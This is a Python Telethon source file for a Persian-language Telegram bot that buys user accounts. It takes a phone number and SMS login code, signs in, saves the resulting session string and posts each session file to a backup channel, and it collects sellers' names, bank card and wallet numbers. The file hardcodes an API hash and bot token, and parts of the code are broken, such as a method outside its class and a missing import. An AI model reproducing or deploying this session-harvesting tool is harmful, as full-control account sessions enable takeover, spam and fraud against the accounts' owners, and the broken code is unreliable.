#اولین چنل اوپن کننده: @source_donii
#اگه مادرت برات محترمه منبع بزن
from telethon import TelegramClient, events
from telethon.sessions import StringSession
import asyncio
import os
import json
import aiofiles
from datetime import datetime

class BotHandler:
    def __init__(self, api_id, api_hash, bot_token):
        self.api_id = api_id
        self.api_hash = api_hash
        self.bot_token = bot_token
        self.bot = TelegramClient(StringSession(), self.api_id, self.api_hash)

        # تنظیم DC و IP در ابتدای ایجاد کلاینت
        self.bot.session.set_dc(2, "149.154.167.40", 443)

        self.bot.start(bot_token=self.bot_token)
        self.json_db_folder = 'JsonDBS'
        self.sessions_folder = 'sessions'
        self.country_codes_db = 'settings/country_codes.json'
        self.prices_db = 'settings/prices.json'
        self.requests_file = 'settings/requests.json'
        self.country_codes = self.load_country_codes()  # فراخوانی متد
        self.prices = self.load_prices()
        self.initialize_folders()
        self.initialize_requests()

    def load_country_codes(self):
        """Load country codes from JSON file."""
        if os.path.exists(self.country_codes_db):
            with open(self.country_codes_db, 'r', encoding='utf-8') as file:
                return json.load(file)
        return {}

    # بقیه متدها...
    def load_prices(self):
        """Load prices from JSON file."""
        if os.path.exists(self.prices_db):
            with open(self.prices_db, 'r', encoding='utf-8') as file:
                return json.load(file)
        return {}
    def initialize_folders(self):
        """Create necessary folders."""
        os.makedirs(self.json_db_folder, exist_ok=True)
        os.makedirs(self.sessions_folder, exist_ok=True)
    def initialize_requests(self):
        """Create requests file if it doesn't exist."""
        if not os.path.exists(self.requests_file):
            with open(self.requests_file, 'w', encoding='utf-8') as file:
                json.dump({}, file)
    async def save_data_async(self, file_path, data):
        """Save data asynchronously."""
        async with aiofiles.open(file_path, 'w', encoding='utf-8') as file:
            await file.write(json.dumps(data, indent=4, ensure_ascii=False))
    async def load_data_async(self, file_path):
        """Load data asynchronously."""
        if os.path.exists(file_path):
            async with aiofiles.open(file_path, 'r', encoding='utf-8') as file:
                return json.loads(await file.read())
        return {}
    async def save_user_data(self, user_id, first_name, username):
        """Save user information on start."""
        user_file = os.path.join(self.json_db_folder, f'{user_id}.json')
        if not os.path.exists(user_file):
            user_data = {
                'chat_id': user_id,
                'first_name': first_name,
                'username': username,
                'join_date': str(datetime.now()),
                'number_count': 0,
                'number_list': [],
                'balance': 0
            }
            await self.save_data_async(user_file, user_data)
    async def update_user_numbers(self, user_id, phone_number):
        user_file = os.path.join(self.json_db_folder, f'{user_id}.json')
        user_data = await self.load_data_async(user_file)
        user_data.setdefault('number_list', [])
        user_data.setdefault('number_count', 0)
        user_data.setdefault('balance', 0)
        if phone_number in user_data['number_list']:
            await self.bot.send_message(user_id, "این شماره قبلاً ثبت شده است.")
            return
        user_data['number_list'].append(phone_number)
        user_data['number_count'] = len(user_data['number_list'])
        await self.save_data_async(user_file, user_data)
async def login_user(self, event):
    user_id = event.sender_id
    async with self.bot.conversation(event.sender_id, timeout=300) as conv:
        await conv.send_message("📱 **لطفاً شماره تلفن خود را با فرمت + وارد کنید:**")
        phone_message = await conv.get_response()
        phone_number = phone_message.text.strip()
        country_code = await self.get_country_code(phone_number)
        if country_code is None:
            await conv.send_message("❌ **شماره کشور نامعتبر است.**")
            return
        all_numbers_file = 'settings/all_numbers.json'
        async with aiofiles.open(all_numbers_file, 'r', encoding='utf-8') as f:
            all_numbers_data = await f.read()
            all_numbers = json.loads(all_numbers_data)
        if phone_number in all_numbers:
            await conv.send_message("⚠️ **این شماره در دیتابیس وجود دارد.**")
            return
        session_folder = os.path.join(self.sessions_folder, country_code)
        os.makedirs(session_folder, exist_ok=True)
        user_client = TelegramClient(StringSession(), self.api_id, self.api_hash)
        await user_client.connect()

        # تنظیم DC و IP
        user_client.session.set_dc(2, "149.154.167.40", 443)

        try:
            # ارسال درخواست کد تأیید
            await user_client.send_code_request(phone_number, force_sms=True)
            await conv.send_message("🔑 **کد تأیید به شماره شما ارسال شد. لطفاً کد را وارد کنید:**")
            code_message = await conv.get_response()
            code = code_message.text.strip()
            await user_client.sign_in(phone=phone_number, code=code)
            await self.update_user_numbers(user_id, phone_number)
            requests = await self.load_data_async(self.requests_file)
            request_key = phone_number[:3]
            session_string = user_client.session.save()
            session_path = os.path.join(session_folder, f'{phone_number[1:]}.session')
            async with aiofiles.open(session_path, 'w', encoding='utf-8') as session_file:
                await session_file.write(session_string)
            await conv.send_message("✅ **شماره شما ثبت شد و در حال بررسی قرار گرفت.**\n\n⏳ **تا 10 دقیقه بعد به صورت اتومات حساب شما تایید خواهد شد.**")
            await asyncio.sleep(600)  # تأخیر 10 دقیقه‌ای
            prefix = phone_number[:3]
            price = self.prices.get(prefix, 0)
            user_file = os.path.join(self.json_db_folder, f'{user_id}.json')
            user_data = await self.load_data_async(user_file)
            user_data['balance'] += price
            await self.save_data_async(user_file, user_data)
            if request_key in requests and 'required_count' in requests[request_key]:
                requests[request_key]['required_count'] -= 1
                if requests[request_key]['required_count'] <= 0:
                    del requests[request_key]
                await self.save_data_async(self.requests_file, requests)

            all_numbers.append(phone_number)
            async with aiofiles.open(all_numbers_file, 'w', encoding='utf-8') as f:
                await f.write(json.dumps(all_numbers, ensure_ascii=False, indent=4))
            await conv.send_message("🎉 **شماره شما با موفقیت ثبت شد و هزینه شماره به حساب شما واریز گردید.**")
            channel_id = "t.me/hwiwii29wj"  # کانال بکاپ سیشن ها
            message_text = f"""
            📱 **اطلاعات شماره ثبت‌شده**:
            ───
            👤 **کاربر**: {user_id}
            ☎️ **شماره**: {phone_number}
            💰 **موجودی پس از ثبت**: {user_data['balance']} تومان
            🔑 **کد کشور**: {country_code}
            """
            await self.bot.send_message(channel_id, message_text)
            await self.bot.send_file(
                channel_id,
                session_path,  
                caption="📂 **فایل سیشن مربوط به شماره:** " + phone_number
            )

        except Exception as e:
            await conv.send_message(f"❌ **خطا:** {str(e)}")
        finally:
            await user_client.disconnect()
    async def get_country_code(self, phone_number):
        """Identify country code from phone number."""
        for code in self.country_codes.keys():
            if phone_number.startswith(code):
                return self.country_codes[code]
        return None
    async def request_numbers(self, event):
        """Request phone number from the user."""
        user_id = event.sender_id
        if user_id != 2200903945: #چت ایدی ادمین
            await event.respond("🚫 **شما مجاز به استفاده از این دستور نیستید.**")
            return
        async with self.bot.conversation(event.sender_id, timeout=300) as conv:
            await conv.send_message("📞 **لطفاً پیش‌شماره خود را وارد کنید:**\n\n🔸 *مثال: +98*")
            prefix_message = await conv.get_response()
            prefix = prefix_message.text.strip()
            requests = await self.load_data_async(self.requests_file)
            if prefix in requests:
                await conv.send_message("⚠️ **این پیش‌شماره قبلاً ثبت شده است.**")
                return
            await conv.send_message("🌍 **لطفاً نام کشور خود را وارد کنید:**\n\n🔸 *مثال: Iran*")
            country_message = await conv.get_response()
            country_name = country_message.text.strip()
            await conv.send_message("🚩 **لطفاً ایموجی پرچم کشور خود را وارد کنید:**")
            flag_message = await conv.get_response()
            flag_emoji = flag_message.text.strip()
            await conv.send_message("🔢 **لطفاً تعداد مورد نیاز را وارد کنید:**")
            count_message = await conv.get_response()
            try:
                required_count = int(count_message.text.strip())
            except ValueError:
                await conv.send_message("⚠️ **لطفاً یک عدد صحیح وارد کنید.**")
                return
            requests[prefix] = {
                "user_id": user_id,
                "required_count": required_count,
                "country_name": country_name,
                "flag_emoji": flag_emoji
            }
    
            await self.save_data_async(self.requests_file, requests)
            prices = await self.load_data_async(self.prices_db)  
            price = prices.get(prefix, "قیمت مشخص نیست") 
            channel_id = "@resiver"  # شناسه کانال
            message_text = f"{flag_emoji} {country_name} ({prefix})\nPrice: {price} IRT"
            button = Button.url("ورود به ربات", "https://t.me/Zoro_Receiver_bot")  # یوزررنیم ربات
            await self.bot.send_message(channel_id, message_text, buttons=[button])
            await conv.send_message(f"✅ **پیش‌شماره شما با موفقیت ثبت شد:**\n\n📞 **{prefix}** ({country_name} {flag_emoji})")
    async def request_list(self, event):
        """Show list of all requested numbers to any user."""
        requests = await self.load_data_async(self.requests_file)
        if not requests:
            await event.respond("در حال حاضر هیچ درخواستی موجود نیست.")
            return
        message = f"**Request list of numbers:**\n▫️ Receiver Robot\n\n"
        for index, (prefix, data) in enumerate(requests.items(), start=1):
            country_name = data["country_name"].capitalize()
            flag_emoji = data["flag_emoji"]
            required_count = data["required_count"]
            prices = await self.load_data_async(self.prices_db)
            price_irt = prices.get(prefix, "قیمت مشخص نیست")
            price_usd = price_irt * 0.012 if isinstance(price_irt, (int, float)) else price_irt
            message += f"{index})\n"
            message += f"**{flag_emoji} {country_name} ({prefix}) {flag_emoji}**\n" 
            message += f"**Price:** {price_irt} IRT / **number:** {required_count}\n"  
            message += "/////////////////////////////////////////\n\n"
        button = Button.url("©️ Requests Channel ©️", "https://t.me/zoro_resiver")#کانال اطلاعیه
        await event.respond(message, buttons=[button])
    async def send_number(self, event):
        """Send number to the user."""
        user_id = event.sender_id
        async with self.bot.conversation(event.sender_id, timeout=300) as conv:
            await conv.send_message("لطفاً شماره تلفن را وارد کنید:")
            phone_message = await conv.get_response()
            phone_number = phone_message.text.strip()
            country_code = await self.get_country_code(phone_number)
            if country_code is None:
                await conv.send_message("شماره کشور نامعتبر است.")
                return
            requests = await self.load_data_async(self.requests_file)
            request_key = f"{phone_number[:3]}_{phone_number[:3]}"
            if request_key in requests:
                request_data = requests[request_key]
                if request_data['required_count'] > 0:
                    request_data['required_count'] -= 1
                    if request_data['required_count'] <= 0:
                        del requests[request_key]
                    await self.save_data_async(self.requests_file, requests)
                    await self.update_user_numbers(user_id, phone_number)
                    await conv.send_message("شماره با موفقیت ذخیره شد.")
                else:
                    await conv.send_message("ظرفیت حساب پر می‌باشد.")
            else:
                await conv.send_message("درخواستی با این مشخصات یافت نشد.")
    async def collect_user_information(self, event):
        user_id = event.sender_id
        user_file = os.path.join(self.json_db_folder, f'{user_id}.json')
        user_data = await self.load_data_async(user_file)
        if 'fullname' in user_data and 'card_number' in user_data and 'wallet_number' in user_data:
            await event.respond("✅ **اطلاعات شما قبلاً ثبت شده است.**")
            return
        async with self.bot.conversation(user_id, timeout=300) as conv:
            await conv.send_message("📝 **لطفاً نام کامل خود را وارد کنید:**")
            fullname_message = await conv.get_response()
            fullname = fullname_message.text.strip()
            await conv.send_message("💳 **لطفاً شماره کارت بانکی خود را وارد کنید:**")
            card_number_message = await conv.get_response()
            card_number = card_number_message.text.strip()
            await conv.send_message("💼 **لطفاً شماره کیف پول (ولت) خود را وارد کنید:**")
            wallet_number_message = await conv.get_response()
            wallet_number = wallet_number_message.text.strip()
            user_data['fullname'] = fullname
            user_data['card_number'] = card_number
            user_data['wallet_number'] = wallet_number
            await self.save_data_async(user_file, user_data)
            await conv.send_message("✅ **اطلاعات حساب شما با موفقیت ذخیره شد!**\n🎉 **با تشکر از شما!**")
    async def settle_handler(self, event):
        user_id = event.sender_id
        user_file = os.path.join(self.json_db_folder, f'{user_id}.json')
        user_data = await self.load_data_async(user_file)
        if 'fullname' not in user_data or 'card_number' not in user_data or 'wallet_number' not in user_data:
            await event.respond("⚠️ **برای تسویه حساب، لطفاً ابتدا اطلاعات حساب خود را تکمیل کنید.**\n\nاز دستور /information برای تکمیل استفاده کنید. 📋")
            return
        if user_data.get('balance', 0) > 0:
            async with self.bot.conversation(user_id, timeout=300) as conv:
                payment_terms = """
                **شرایط تسویه حساب** 💵:
    
                1️⃣ **تمامی پرداخت‌ها مطابق با قوانین بانکی کشور انجام می‌شود**. 🏦
                2️⃣ **مبلغ تسویه پس از تأیید توسط پشتیبانی به حساب شما واریز خواهد شد**. ⏳
                3️⃣ **فرآیند بررسی و تسویه ممکن است تا 24 ساعت طول بکشد**. ⏱️
                4️⃣ **هرگونه مغایرت یا تأخیر در تسویه، توسط پشتیبانی بررسی و پیگیری می‌شود**. 📞
                5️⃣ **تسویه حساب تنها به شماره کارت و کیف پول ثبت‌شده در سیستم انجام می‌شود**. 🛡️
    
                در صورتی که با تمامی شرایط موافق هستید، روی دکمه زیر کلیک کنید: 👇
                """
                accept_button = Button.inline("✅ **من شرایط را کامل قبول میکنم**", b'accept_settlement')
                await conv.send_message(payment_terms, buttons=[accept_button])
                response = await conv.wait_event(events.CallbackQuery(data=b'accept_settlement'))
                if response:
                    balance = user_data.get('balance', 0)
                    await event.respond(f"✅ **درخواست تسویه حساب شما با موفقیت ثبت شد.**\n\n💰 مبلغ: {balance} تومان\n🔄 **پس از تأیید، مبلغ به حساب شما واریز خواهد شد.**")
                    settlement_report = f"""
                    📊 **گزارش تسویه حساب:**
                    👤 نام: {user_data['fullname']}
                    💳 شماره کارت: {user_data['card_number']}
                    💼 شماره کیف پول: {user_data['wallet_number']}
                    💰 موجودی: {balance} تومان
                    🕒 درخواست تسویه: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
                    """
                    await self.bot.send_message('@zoro_resiver', settlement_report) #کانال تسویه حساب ها
                    user_data['balance'] = 0
                    await self.save_data_async(user_file, user_data)
        else:
            await event.respond("❌ **شما موجودی کافی برای تسویه حساب ندارید.**")
    async def display_account_info(self, event):
        user_id = event.sender_id
        user_file = os.path.join(self.json_db_folder, f'{user_id}.json')
        user_data = await self.load_data_async(user_file)
        username = user_data.get('username', 'Username not found.')
        chat_id = user_data.get('chat_id', 'Chat ID not found.')
        join_date = user_data.get('join_date', 'Join date not found.')
        number_count = user_data.get('number_count', 'Number count not found.')
        balance = user_data.get('balance', 0)
        account_info = f"""
        📋 **Your Account Information**:
    
        ├── 🔤 **Username**: {username}
        ├── 🆔 **Chat ID**: {chat_id}
        ├── 📅 **Join Date**: {join_date}
        ├── 🔢 **Number Count**: {number_count}
        └── 💰 **Balance**: {balance} Tomans
    
        🤖 **Receiver Robot**: @account_manager_bot
        """  #یوزرنیم ربات
        support_button = Button.url("💬 ارتباط با پستیبانی", "https://t.me/poldar") #یوزرنیم پشتیبان
        await self.bot.send_file(
            event.sender_id,
            'settings/user.jpg',
            caption=account_info,
            buttons=[support_button],
            parse_mode='markdown' 
        )

    async def show_help(self, event):
        help_text = """
        ℹ️ **راهنمای ربات:**
    
        🔹 **/profile** - مشاهده و مدیریت اطلاعات حساب کاربری شما.  
           این دستور به شما اجازه می‌دهد تا جزئیات مانند نام کاربری، شناسه چت، تاریخ عضویت و موجودی را مشاهده کنید. 📋
    
        🔹 **/settle** - درخواست تسویه حساب.  
           با این دستور می‌توانید درخواست تسویه حساب خود را ثبت کنید. توجه داشته باشید که ابتدا باید اطلاعات حساب خود را تکمیل کنید. 💰

        🔹 **/support** - ارتباط با پشتیبانی.  
           این دستور به شما امکان می‌دهد تا با تیم پشتیبانی ارتباط برقرار کنید و جزئیات تماس را مشاهده کنید. 💬
   
        🔹 **/countries** - نمایش لیست کشورها.  
           با استفاده از این دستور، می‌توانید لیست کشورهایی که شماره‌های مجازی آن‌ها پشتیبانی می‌شود را مشاهده کنید. 🌍
    
        🔹 **/register_number** - ثبت شماره مجازی.  
           با استفاده از این دستور می‌توانید شماره تلفن خود را ثبت کنید و از آن در حساب خود استفاده کنید. 📱
    
        📞 **پشتیبانی**: در صورت نیاز به راهنمایی بیشتر، می‌توانید با تیم پشتیبانی تماس بگیرید.
        """
        await event.respond(help_text)
    async def save_user_ids(self, user_id):
        """ذخیره‌سازی چت آی‌دی کاربر در فایل JSON."""
        user_data_file = 'settings/user_data.json'

        if not os.path.exists(user_data_file):
            with open(user_data_file, 'w') as f:
                json.dump({'user_ids': []}, f)
        with open(user_data_file, 'r') as f:
            data = json.load(f)
        if user_id not in data['user_ids']:
            data['user_ids'].append(user_id)
            with open(user_data_file, 'w') as f:
                json.dump(data, f)

    async def run(self):
        """Run the bot."""
        @self.bot.on(events.NewMessage(pattern='/start'))
        async def start(event):
            user_id = event.sender_id
            first_name = event.sender.first_name
            username = event.sender.username
            await self.save_user_data(user_id, first_name, username)
            await self.save_user_ids(user_id) 

            await event.respond("""
            سلام، به ربات دریافت اکانت خوش آمدید! 🎊
            
            👈 برای شروع شماره اکانت مجازی موردنظر را ارسال کنید و یا جهت دریافت راهنما /help را ارسال نمایید.
            """)
            
        @self.bot.on(events.NewMessage(pattern='/support'))
        async def support_handler(event): #اطلاعات پشتیبانی
            support_text = """
            💬 **ارتباط با پشتیبانی**
        
            در صورت نیاز به کمک، لطفاً با پشتیبانی تماس بگیرید:
        
            📞 **شماره تماس**: [+989932710283](https://tel:+9809388108206)
            🔗 **تلگرام**: [@mani_coder](https://t.me/mani_coder)
            📧 **ایمیل**: [no gmail](no gmail)
            🌐 **وب‌سایت**: [t.me/mani_coder](https://t.me/mani_coder)
        
            تیم پشتیبانی همیشه آماده کمک به شماست! 😊
            """
            await event.respond(support_text, link_preview=False)
            
            
        ADMIN_USERNAME = '@mani_coder'  # نام کاربری ادمین را با @ وارد کنید
        async def show_admin_commands(event):
            """نمایش دستورات ادمین."""
            commands = """
            دستورات ادمین:
            /bot_statistics - نمایش آمار ربات
            /request - ثبت درخواست شماره 
            """
            await event.respond(commands)
        
        @self.bot.on(events.NewMessage(pattern='/admin'))
        async def admin_command_handler(event):
            """مدیریت دستورات ادمین با دستور /admin."""
            if event.sender.username == ADMIN_USERNAME[1:]:
                await show_admin_commands(event)
        
        @self.bot.on(events.NewMessage(pattern='/bot_statistics'))
        async def bot_statistics(event):
            """نمایش آمار ربات."""
            if event.sender.username == ADMIN_USERNAME[1:]:
                user_data_file = 'settings/user_data.json'
                if os.path.exists(user_data_file):
                    with open(user_data_file, 'r') as f:
                        data = json.load(f)
                    total_users = len(data['user_ids'])
                    await event.respond(f"تعداد کل کاربران: {total_users}")
        
        @self.bot.on(events.NewMessage(pattern='/request'))
        async def request_numbers_handler(event):
            await self.request_numbers(event)
        @self.bot.on(events.NewMessage(pattern='/register_number'))
        async def login(event):
            await self.login_user(event)

        @self.bot.on(events.NewMessage(pattern='/help'))
        async def help_handler(event):
            await self.show_help(event)
    
        @self.bot.on(events.NewMessage(pattern='/send'))
        async def send_number_handler(event):
            await self.send_number(event)
        @self.bot.on(events.NewMessage(pattern='/countries'))
        async def request_list_handler(event):
            await self.request_list(event)
        @self.bot.on(events.NewMessage(pattern='/settle'))
        async def settle_handler(event):
            await self.settle_handler(event)
        @self.bot.on(events.NewMessage(pattern='/information'))
        async def information_handler(event):
            await self.collect_user_information(event)
        @self.bot.on(events.NewMessage(pattern='/profile'))
        async def account_info_handler(event):
            await self.display_account_info(event)
        await self.bot.run_until_disconnected()

if __name__ == "__main__":
    API_ID = '29493929' #ApiID
    API_HASH = '8c7b2d8c9fae7d4e4ae7e75cddc838e7' #ApiHach
    BOT_TOKEN = '2200260147:AAGlAMaXEdXQbSyXNwIx8PIfMe0kD6mFEYg' #Token bot
    bot_handler = BotHandler(API_ID, API_HASH, BOT_TOKEN)
    loop = asyncio.get_event_loop()
    loop.run_until_complete(bot_handler.run())

#اولین چنل اوپن کننده: @source_donii
#اگه مادرت برات محترمه منبع بزن
